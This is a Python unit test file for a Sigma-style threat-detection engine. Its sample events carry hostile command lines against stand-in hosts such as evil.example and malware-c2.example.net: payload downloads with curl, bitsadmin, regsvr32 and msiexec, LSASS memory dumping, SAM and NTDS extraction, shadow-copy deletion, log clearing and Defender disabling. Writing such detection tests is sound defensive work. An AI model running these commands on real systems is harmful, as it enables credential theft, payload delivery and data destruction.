# Author : Krishnendu De
# Co-Author: Claude Fable 5.0
"""Unit tests for the Sigma-subset detection engine (no database needed)."""
from pathlib import Path

from app.detection.engine import (DetectionEngine, Rule, alert_from_match,
                                   flatten_event, load_rules, match_rule)
from app.models import NormalizedEvent

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _match(detection: dict, logsource: dict | None = None, **fields) -> bool:
    fields.setdefault("vendor", "v")
    rule = Rule(id="t", title="t", level="low", description="",
                logsource=logsource or {}, detection=detection)
    return match_rule(rule, flatten_event(NormalizedEvent(event_time=None, **fields)))


# ── value / selection matching ──────────────────────────────────────────────
def test_equals_and_contains():
    assert _match({"s": {"action": "deny"}, "condition": "s"}, action="deny")
    assert not _match({"s": {"action": "deny"}, "condition": "s"}, action="allow")
    assert _match({"s": {"message|contains": "failed"}, "condition": "s"},
                  message="Logon failed for user")


def test_value_list_is_or_and_all_modifier_is_and():
    d = {"s": {"action": ["allow", "accept"]}, "condition": "s"}
    assert _match(d, action="accept") and not _match(d, action="drop")
    allmode = {"s": {"message|contains|all": ["alpha", "beta"]}, "condition": "s"}
    assert _match(allmode, message="alpha and beta here")
    assert not _match(allmode, message="only alpha")


def test_wildcard_startswith_and_null():
    assert _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="FIN-WS-014")
    assert not _match({"s": {"host_name": "FIN-*"}, "condition": "s"}, host_name="HR-1")
    assert _match({"s": {"user_name": None}, "condition": "s"})            # field absent


def test_keywords_search_all_fields():
    d = {"k": ["certutil", "bitsadmin"], "condition": "k"}
    assert _match(d, message="cmd /c certutil -urlcache -f http://x/y.exe")
    assert not _match(d, message="nothing to see")


# ── condition grammar ───────────────────────────────────────────────────────
def test_condition_and_not():
    d = {"a": {"action": "deny"}, "b": {"protocol": "tcp"}, "condition": "a and not b"}
    assert _match(d, action="deny", protocol="udp")
    assert not _match(d, action="deny", protocol="tcp")


def test_condition_one_of_and_all_of_wildcard():
    d = {"sel_x": {"action": "deny"}, "sel_y": {"action": "drop"}, "condition": "1 of sel_*"}
    assert _match(d, action="drop") and not _match(d, action="allow")
    d2 = {"sel_x": {"action": "deny"}, "sel_y": {"protocol": "tcp"}, "condition": "all of sel_*"}
    assert _match(d2, action="deny", protocol="tcp")
    assert not _match(d2, action="deny", protocol="udp")


def test_modifier_cidr():
    d = {"s": {"src_ip|cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "condition": "s"}
    assert _match(d, src_ip="10.1.2.3") and _match(d, src_ip="192.168.5.5")
    assert not _match(d, src_ip="203.0.113.9")
    assert not _match(d, src_ip="not-an-ip")


def test_modifier_numeric_comparisons():
    assert _match({"s": {"dst_port|gte": 1024}, "condition": "s"}, dst_port=3389)
    assert not _match({"s": {"dst_port|lt": 1024}, "condition": "s"}, dst_port=3389)
    assert _match({"s": {"bytes_total|gt": 1000000}, "condition": "s"}, bytes_total=5_000_000)


def test_modifier_exists_and_fieldref():
    assert _match({"s": {"user_name|exists": True}, "condition": "s"}, user_name="jdoe")
    assert _match({"s": {"host_name|exists": False}, "condition": "s"})       # absent
    assert not _match({"s": {"user_name|exists": True}, "condition": "s"})
    # fieldref: user_name equals the (raw) caller field
    d = {"s": {"user_name|fieldref": "caller"}, "condition": "s"}
    assert _match(d, user_name="svc-1", raw={"caller": "svc-1"})
    assert not _match(d, user_name="svc-1", raw={"caller": "other"})


def test_modifier_base64offset_and_windash():
    # 'IEX' embedded anywhere in a base64 blob is caught by base64offset|contains
    import base64
    blob = base64.b64encode(b"random IEX(New-Object Net.WebClient)").decode()
    assert _match({"s": {"message|base64offset|contains": "IEX"}, "condition": "s"},
                  message=blob)
    # windash: a rule written with -enc also matches the /enc form
    d = {"s": {"message|windash|contains": "-enc"}, "condition": "s"}
    assert _match(d, message="powershell -enc ABC") and _match(d, message="powershell /enc ABC")


def test_modifier_re_flags():
    # multiline + ignorecase via |re|m|i
    d = {"s": {"message|re|m|i": "^error"}, "condition": "s"}
    assert _match(d, message="line one\nERROR happened")


def test_logsource_filters_by_vendor_and_logtype():
    d = {"s": {"action": "failed-logon"}, "condition": "s"}
    ls = {"vendor": "microsoft", "log_type": "security"}
    assert _match(d, ls, vendor="microsoft", log_type="security", action="failed-logon")
    # wrong vendor -> no match even though the selection would hit
    assert not _match(d, ls, vendor="cisco", log_type="security", action="failed-logon")


# ── the shipped rule library ────────────────────────────────────────────────
def test_rules_load_with_mitre_tags():
    rules = load_rules(RULES_DIR)
    ids = {r.id for r in rules}
    assert {"lo-win-failed-logon", "lo-rdp-allowed", "lo-ingress-tool-transfer",
            "lo-clear-eventlog"} <= ids
    flog = next(r for r in rules if r.id == "lo-win-failed-logon")
    assert "T1110" in flog.techniques and "credential access" in flog.tactics


def test_engine_fires_expected_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-win-failed-logon" in hits(vendor="microsoft", log_type="security",
                                         action="failed-logon")
    rdp = hits(vendor="paloalto", dst_port=3389, action="allow")
    assert "lo-rdp-allowed" in rdp
    assert "lo-rdp-allowed" not in hits(vendor="paloalto", dst_port=3389, action="deny")
    assert "lo-ingress-tool-transfer" in hits(
        vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")
    assert "lo-clear-eventlog" in hits(vendor="microsoft", raw={"EventID": 1102})


def test_rule_pack_loads_and_is_well_formed():
    rules = load_rules(RULES_DIR)
    by_id = {r.id for r in rules}
    expected = {"lo-aws-logging-disabled", "lo-aws-root-console-login",
                "lo-aws-sg-open-world", "lo-aws-access-key-created",
                "lo-entra-risky-signin", "lo-entra-legacy-auth",
                "lo-okta-admin-grant", "lo-okta-mfa-deactivated",
                "lo-m365-inbox-forwarding", "lo-github-repo-public",
                "lo-powershell-encoded", "lo-external-rdp-inbound"}
    assert expected <= by_id
    # every shipped detection rule has a level, a condition and parsed MITRE tags
    for r in rules:
        assert r.level in ("low", "medium", "high", "critical", "informational")
        assert r.detection.get("condition")
        assert r.techniques, f"{r.id} has no technique tag"


def test_engine_fires_cloud_and_identity_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-aws-logging-disabled" in hits(
        vendor="aws", product="cloudtrail", rule_name="StopLogging")
    assert "lo-aws-root-console-login" in hits(
        vendor="aws", product="cloudtrail", rule_name="ConsoleLogin",
        raw={"userIdentity": {"type": "Root"}})
    assert "lo-entra-risky-signin" in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="high")
    assert "lo-entra-risky-signin" not in hits(
        vendor="microsoft", product="entra", log_type="signin",
        action="success", severity="low")
    assert "lo-m365-inbox-forwarding" in hits(
        vendor="microsoft", product="o365", action="New-InboxRule",
        message="Created rule with ForwardTo attacker@evil.test")
    assert "lo-okta-mfa-deactivated" in hits(
        vendor="okta", log_type="user.mfa.factor.deactivate")


def test_engine_fires_modifier_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    # cidr: public source fires, RFC1918 source does not
    assert "lo-external-rdp-inbound" in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="203.0.113.7")
    assert "lo-external-rdp-inbound" not in hits(
        vendor="paloalto", dst_port=3389, action="allow", src_ip="10.20.30.40")
    # windash: the /enc form of an encoded PowerShell command
    assert "lo-powershell-encoded" in hits(
        vendor="x", message="powershell.exe /enc SQBFAFgA")


def test_engine_fires_tripwire_fim_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def tw(resource=None, message=None, action=None, vendor="tripwire"):
        return dict(vendor=vendor, product="tripwire enterprise", log_type="fileintegrity",
                    action=action, message=message,
                    raw={"attributes": {"resource": resource} if resource else {}})

    # each FIM rule fires on its indicator (resource carried in raw.attributes)
    assert "lo-tripwire-critical-file-change" in hits(
        **tw(resource="/etc/shadow", message="Monitored file changed: /etc/shadow"))
    assert "lo-tripwire-web-shell" in hits(
        **tw(resource="/var/www/html/cmd.php", action="added"))
    assert "lo-tripwire-persistence-change" in hits(
        **tw(resource="/etc/cron.d/backdoor", action="added"))
    assert "lo-tripwire-monitoring-disabled" in hits(
        **tw(message="Real-time monitoring stopped for node FIN-WS-014", action="disabled"))
    assert "lo-tripwire-object-removed" in hits(
        **tw(resource="/var/log/audit/audit.log", message="object removed", action="removed"))

    # negatives: a benign monitored change fires nothing, and the vendor gate
    # keeps a non-Tripwire event with the same path from tripping these rules.
    assert not {i for i in hits(**tw(resource="/tmp/app.log", action="modified"))
                if "tripwire" in i}
    assert not {i for i in hits(vendor="cisco", message="changed /etc/shadow",
                                raw={"attributes": {"resource": "/etc/shadow"}})
                if "tripwire" in i}


def test_existing_rules_fire_on_endpoint_telemetry():
    """The new Sysmon / auditd parsers feed CommandLine into the fields existing
    command-line rules already match — so endpoint telemetry lights them up."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    assert "lo-powershell-encoded" in hits(          # Sysmon EID 1 process create
        vendor="microsoft", product="sysmon", log_type="process-create",
        action="process-create", message="powershell.exe -enc SQBFAFgA")
    assert "lo-ingress-tool-transfer" in hits(       # Linux auditd EXECVE
        vendor="linux", product="auditd", log_type="execve", action="process-create",
        message="curl -O http://malware-c2.example.net/x.sh")


def test_engine_fires_sysmon_endpoint_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    assert "lo-sysmon-office-spawns-shell" in hits(
        **sm(ParentImage=r"C:\Office\winword.exe", Image=r"C:\Windows\System32\cmd.exe"))
    assert "lo-sysmon-lolbin-proxy-exec" in hits(
        **sm(Image=r"C:\Windows\System32\regsvr32.exe",
             CommandLine="regsvr32 /s /u /i:http://evil/x.sct scrobj.dll"))
    assert "lo-sysmon-registry-runkey-persistence" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil"))
    assert "lo-sysmon-lsass-dump" in hits(
        **sm(Image=r"C:\Windows\System32\rundll32.exe",
             CommandLine=r"rundll32 comsvcs.dll MiniDump 640 C:\lsass.dmp full"))
    assert "lo-inhibit-recovery-shadowcopy" in hits(
        **sm(CommandLine="vssadmin delete shadows /all /quiet"))
    assert "lo-schtasks-persistence" in hits(
        **sm(CommandLine="schtasks /create /tn U /tr calc /sc onlogon"))
    assert "lo-sysmon-wmi-persistence" in hits(**sm("wmi-consumer"))
    assert "lo-clear-eventlog-cmdline" in hits(
        **sm(Image=r"C:\Windows\System32\wevtutil.exe", CommandLine="wevtutil cl Security"))
    # a benign process create trips none of the endpoint rules
    benign = hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
                       ParentImage=r"C:\Windows\explorer.exe", CommandLine="notepad readme.txt"))
    assert not {i for i in benign
                if i.startswith(("lo-sysmon", "lo-inhibit", "lo-schtasks", "lo-clear-eventlog-cmd"))}


def test_engine_fires_nutanix_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def api(action=None, endpoint=None):
        return dict(vendor="nutanix", product="prism-central", log_type="api_audit",
                    action=action, rule_name=endpoint,
                    raw={"restEndpoint": endpoint, "httpMethod": action})

    def audit(message=None, action=None):
        return dict(vendor="nutanix", product="prism-central", log_type="audit",
                    action=action, message=message)

    # api DELETE on a specific VM fires; a benign GET / a DELETE on /vms/list do not.
    assert "lo-nutanix-vm-destruction" in hits(
        **api(action="DELETE", endpoint="/api/nutanix/v3/vms/5f3c9d2a-1b2c"))
    assert "lo-nutanix-vm-destruction" not in hits(
        **api(action="GET", endpoint="/api/nutanix/v3/vms/list"))
    assert "lo-nutanix-vm-destruction" not in hits(
        **api(action="DELETE", endpoint="/api/nutanix/v3/vms/list"))

    # consolidated-audit indicators
    assert "lo-nutanix-cluster-unregister" in hits(
        **audit(message="Unregistered cluster Prod-PE-01 from Prism Central", action="Delete"))
    assert "lo-nutanix-privilege-change" in hits(
        **audit(message="Updated role mapping for user contractor01 to Cluster Admin"))

    # a benign VM-list read from a non-nutanix source trips none of these rules
    assert not {i for i in hits(vendor="okta", message="role mapping updated")
                if i.startswith("lo-nutanix")}


def test_load_nutanix_flow_drop_correlation_rule():
    from app.detection.correlation import load_correlation_rules
    by_id = {r.id: r for r in load_correlation_rules(RULES_DIR)}
    fd = by_id["lo-corr-nutanix-flow-drop-burst"]
    assert fd.match["vendor"] == "nutanix" and fd.match["action"] == "drop"
    assert fd.group_by == ["src_ip"]
    assert fd.window == 300 and fd.threshold == 20
    assert "T1046" in fd.techniques


def test_engine_fires_nutanix_files_rules():
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def fa(action=None, path=None, message=None):
        return dict(vendor="nutanix", product="files", log_type="file-audit",
                    action=action, rule_name=path, message=message)

    # a rename to a ransomware extension fires; a normal .xlsx write does not
    assert "lo-nutanix-files-ransomware-ext" in hits(
        **fa(action="rename", path="/Finance/q2.xlsx.locked",
             message="CORP\\attacker renamed /Finance/q2.xlsx -> /Finance/q2.xlsx.locked"))
    assert "lo-nutanix-files-ransomware-ext" in hits(
        **fa(action="create", path="/share/HOW_TO_DECRYPT.txt"))
    assert "lo-nutanix-files-ransomware-ext" not in hits(
        **fa(action="write", path="/Finance/q2.xlsx"))
    # a read of an already-encrypted file is not the encryption act -> no fire
    assert "lo-nutanix-files-ransomware-ext" not in hits(
        **fa(action="read", path="/Finance/q2.xlsx.locked"))

    assert "lo-nutanix-files-permission-change" in hits(**fa(action="security-change",
                                                             path="/Finance/payroll"))
    # benign ops trip nothing
    assert not {i for i in hits(**fa(action="read", path="/HR/handbook.pdf"))
                if i.startswith("lo-nutanix-files")}


def test_load_nutanix_files_mass_delete_correlation_rule():
    from app.detection.correlation import load_correlation_rules
    by_id = {r.id: r for r in load_correlation_rules(RULES_DIR)}
    md = by_id["lo-corr-nutanix-files-mass-delete"]
    assert md.match["vendor"] == "nutanix" and md.match["product"] == "files"
    assert "delete" in md.match["action"]
    assert md.group_by == ["user_name"]
    assert md.window == 600 and md.threshold == 50
    assert "T1486" in md.techniques


def test_alert_from_match_builds_row():
    rule = next(r for r in load_rules(RULES_DIR) if r.id == "lo-win-failed-logon")
    evt = NormalizedEvent(event_time=None, vendor="microsoft", log_type="security",
                          action="failed-logon", user_name="CORP\\jdoe",
                          src_ip="45.83.122.7", message="x" * 5000)
    a = alert_from_match(rule, evt, dedup_hash="abc123", batch_id=7)
    assert a["rule_id"] == "lo-win-failed-logon" and a["level"] == "low"
    assert "T1110" in a["techniques"] and "credential access" in a["tactics"]
    assert a["src_ip"] == "45.83.122.7" and a["user_name"] == "CORP\\jdoe"
    assert a["dedup_hash"] == "abc123" and a["batch_id"] == 7
    assert len(a["message"]) == 1000          # truncated for storage


# ── Phase 2: Windows / Sysmon high-fidelity endpoint pack ────────────────────
def test_engine_fires_phase2_endpoint_rules():
    """Each Phase 2 rule fires on its positive indicator (fields carried in raw,
    as the Sysmon / Windows-Security parsers surface them)."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    # 1 LSASS memory access (EID10) — sensitive mask, non-benign source
    assert "lo-sysmon-lsass-memory-access" in hits(
        **sm("process-access", TargetImage=r"C:\Windows\System32\lsass.exe",
             GrantedAccess="0x1410", SourceImage=r"C:\Temp\evil.exe"))
    # 2 credential-dumper tool — by image, by original filename, by argument
    assert "lo-sysmon-credential-dumper-tools" in hits(**sm(Image=r"C:\Temp\m.exe",
                                                            OriginalFileName="mimikatz.exe"))
    assert "lo-sysmon-credential-dumper-tools" in hits(
        **sm(Image=r"C:\a\b.exe", CommandLine="b.exe sekurlsa::logonpasswords"))
    # 3 NTDS / SAM extraction
    assert "lo-sysmon-ntds-sam-extraction" in hits(
        **sm(CommandLine=r'ntdsutil "ac i ntds" "create full C:\temp" q q'))
    assert "lo-sysmon-ntds-sam-extraction" in hits(
        **sm(CommandLine=r"reg save hklm\sam C:\temp\sam.hive"))
    # 4 remote thread into a sensitive process (EID8)
    assert "lo-sysmon-remote-thread-injection" in hits(
        **sm("create-remote-thread", TargetImage=r"C:\Windows\System32\lsass.exe",
             SourceImage=r"C:\Users\p\AppData\Local\Temp\x.exe"))
    # 5 BYOVD vulnerable driver load (EID6)
    assert "lo-sysmon-byovd-driver-load" in hits(
        **sm("driver-load", ImageLoaded=r"C:\Windows\Temp\RTCore64.sys"))
    # 6 UAC bypass registry hijack (EID13)
    assert "lo-sysmon-uac-bypass-registry" in hits(
        **sm("registry-set",
             TargetObject=r"HKU\S-1-5-21\Software\Classes\ms-settings\Shell\Open\command\(Default)"))
    # 7 LSA / AppInit / Winlogon-Notify persistence
    assert "lo-sysmon-lsa-appinit-persistence" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"))
    # 8 WDigest UseLogonCredential enabled
    assert "lo-sysmon-wdigest-uselogoncredential" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
             Details="DWORD (0x00000001)"))
    # 9 Defender disabled (registry and PowerShell paths)
    assert "lo-sysmon-defender-disable" in hits(
        **sm("registry-set",
             TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring"))
    assert "lo-sysmon-defender-disable" in hits(
        **sm(CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true"))
    # 10 AMSI / ETW tampering
    assert "lo-sysmon-amsi-etw-tamper" in hits(
        **sm(CommandLine="powershell [Ref].Assembly.GetType('...AmsiUtils') AmsiScanBuffer patch"))
    # 11 PsExec / remote service exec
    assert "lo-sysmon-psexec-service-exec" in hits(**sm(Image=r"C:\Windows\PSEXESVC.exe"))
    assert "lo-sysmon-psexec-service-exec" in hits(
        **sm(CommandLine=r"psexec \\FIN-DC01 -accepteula -s cmd.exe"))
    # 12 msiexec installing a remote package
    assert "lo-sysmon-msiexec-remote-package" in hits(
        **sm(Image=r"C:\Windows\System32\msiexec.exe",
             CommandLine="msiexec /i https://evil.example/x.msi /quiet"))
    # 13 BITS transfer
    assert "lo-sysmon-bits-transfer" in hits(
        **sm(CommandLine="bitsadmin /transfer job http://evil.example/a.exe C:\\a.exe"))
    # 14 Cobalt Strike default named pipe (EID17)
    assert "lo-sysmon-c2-named-pipe" in hits(**sm("pipe-create", PipeName=r"\msagent_a1"))
    # 15 local account created (Windows Security 4720)
    assert "lo-win-local-account-created" in hits(
        vendor="microsoft", log_type="security", action="user-created")


def test_phase2_benign_endpoint_activity_stays_quiet():
    """Benign endpoint activity that superficially resembles the indicators must
    NOT trip the Phase 2 rules (false-positive guards)."""
    eng = DetectionEngine(load_rules(RULES_DIR))

    def hits(**kw):
        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}

    def sm(log_type="process-create", **fields):
        return dict(vendor="microsoft", product="sysmon", log_type=log_type,
                    action=log_type, raw=fields)

    def phase2(ids):
        return {i for i in ids if i in {
            "lo-sysmon-lsass-memory-access", "lo-sysmon-credential-dumper-tools",
            "lo-sysmon-ntds-sam-extraction", "lo-sysmon-remote-thread-injection",
            "lo-sysmon-byovd-driver-load", "lo-sysmon-uac-bypass-registry",
            "lo-sysmon-lsa-appinit-persistence", "lo-sysmon-wdigest-uselogoncredential",
            "lo-sysmon-defender-disable", "lo-sysmon-amsi-etw-tamper",
            "lo-sysmon-psexec-service-exec", "lo-sysmon-msiexec-remote-package",
            "lo-sysmon-bits-transfer", "lo-sysmon-c2-named-pipe",
            "lo-win-local-account-created"}}

    # Defender itself reading LSASS is on the benign-source exclusion list
    assert not phase2(hits(**sm("process-access",
                                TargetImage=r"C:\Windows\System32\lsass.exe",
                                GrantedAccess="0x1410",
                                SourceImage=r"C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe")))
    # local msiexec install (no remote source) does not fire the remote-package rule
    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\msiexec.exe",
                                CommandLine=r"msiexec /i C:\pkgs\app.msi /quiet")))
    # a legitimate GPU driver load is not a BYOVD hit
    assert not phase2(hits(**sm("driver-load", ImageLoaded=r"C:\Windows\System32\drivers\nvlddmkm.sys")))
    # Chrome's mojo IPC pipe is not a Cobalt Strike pipe
    assert not phase2(hits(**sm("pipe-create", PipeName=r"\mojo.7890.12345.9876543210")))
    # reading (not saving) a hive is not extraction
    assert not phase2(hits(**sm(CommandLine=r"reg query hklm\sam")))
    # WDigest key set back to 0 is not the credential-caching enable
    assert not phase2(hits(**sm("registry-set",
                                TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
                                Details="DWORD (0x00000000)")))
    # a plain interactive logon is not account creation
    assert not phase2(hits(vendor="microsoft", log_type="security", action="logon"))
    # an everyday process create trips none of the pack
    assert not phase2(hits(**sm(Image=r"C:\Windows\System32\notepad.exe",
                                ParentImage=r"C:\Windows\explorer.exe",
                                CommandLine="notepad C:\\Users\\p\\notes.txt")))


def test_sysmon_parser_surfaces_eid_fields_for_phase2_rules():
    """End-to-end: a rendered-Message Get-WinEvent JSON export (the shape analysts
    actually produce) flows through the Sysmon parser and lights up the EID 10 / 6
    rules — proving the lifted SourceImage/TargetImage/GrantedAccess/ImageLoaded
    fields resolve, not only synthetic EventData."""
    import json

    from app.parsers.sysmon import parse as sysmon_parse

    eng = DetectionEngine(load_rules(RULES_DIR))

    def fired(content):
        ids = set()
        for evt in sysmon_parse(content):
            ids |= {r.id for r in eng.evaluate_event(evt)}
        return ids

    eid10 = json.dumps({
        "Id": 10, "MachineName": "FIN-WS-014",
        "Message": "Process accessed:\r\nUtcTime: 2026-01-02 10:11:12.345\r\n"
                   "SourceImage: C:\\Users\\p\\AppData\\Local\\Temp\\evil.exe\r\n"
                   "SourceProcessId: 4242\r\n"
                   "TargetImage: C:\\Windows\\System32\\lsass.exe\r\n"
                   "GrantedAccess: 0x1410\r\n"
                   "CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c534|UNKNOWN(...)\r\n"})
    assert "lo-sysmon-lsass-memory-access" in fired(eid10)

    eid6 = json.dumps({
        "Id": 6, "MachineName": "FIN-WS-014",
        "Message": "Driver loaded:\r\nUtcTime: 2026-01-02 10:15:00.000\r\n"
                   "ImageLoaded: C:\\Windows\\Temp\\RTCore64.sys\r\n"
                   "Signed: true\r\nSignature: MICRO-STAR INTERNATIONAL\r\n"
                   "SignatureStatus: Valid\r\n"})
    assert "lo-sysmon-byovd-driver-load" in fired(eid6)
